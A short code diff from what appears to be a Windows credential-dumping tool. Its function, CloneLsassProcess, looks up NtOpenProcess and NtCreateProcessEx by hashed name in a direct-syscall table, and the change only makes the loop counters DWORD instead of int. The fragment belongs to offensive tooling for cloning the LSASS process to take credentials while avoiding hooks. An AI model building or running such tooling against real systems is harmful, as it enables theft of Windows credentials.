@@ -105,7 +105,7 @@ HANDLE CloneLsassProcess() {
 
   DWORD64 hNtOpenP = djb2((PBYTE) "NtOpenProcess");
   int idxOpenP = -1;
-  for (int i = 0; i < SyscallList.Count; i++) {
+  for (DWORD i = 0; i < SyscallList.Count; i++) {
     if (SyscallList.Entries[i].dwHash == hNtOpenP) {
       idxOpenP = i;
       break;
@@ -205,7 +205,7 @@ HANDLE CloneLsassProcess() {
 
   DWORD64 hNtCPX = djb2((PBYTE) "NtCreateProcessEx");
   int idxNtCPX = -1;
-  for (int i = 0; i < SyscallList.Count; i++) {
+  for (DWORD i = 0; i < SyscallList.Count; i++) {
     if (SyscallList.Entries[i].dwHash == hNtCPX) {
       idxNtCPX = i;
       break;
